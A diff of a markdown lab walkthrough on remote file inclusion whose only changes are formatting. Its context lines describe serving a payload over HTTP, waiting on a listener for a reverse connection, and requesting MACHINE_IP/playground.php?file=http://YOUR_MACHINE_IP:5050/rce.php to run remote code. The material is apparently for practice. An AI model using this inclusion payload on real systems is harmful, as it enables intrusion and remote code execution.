@@ -181,10 +181,10 @@ This should look as below.
 
 Perfect now we have our payload set, our http server running to serve the payload and or listner going to wait for the reverse connection. Lets run the payload.  
 
-Navigate to the ```MACHINE_IP/playground.php?``` site and input the below into the address bar.
+Navigate to the ```MACHINE_IP/playground.php?``` site and input the below into the address bar.  
 ```MACHINE_IP/playground.php?file=http://YOUR_MACHINE_IP:5050/rce.php```
 Which should look like the below  
-![lab4_url](./Images/lab4_url.png)
+![Lab4_url](./Images/Lab4_url.png)
 
 If successful we should se a GET request was recived by our http server.  
 ![lab4_http_server_manual](./Images/lab4_http_server_manual.png)  
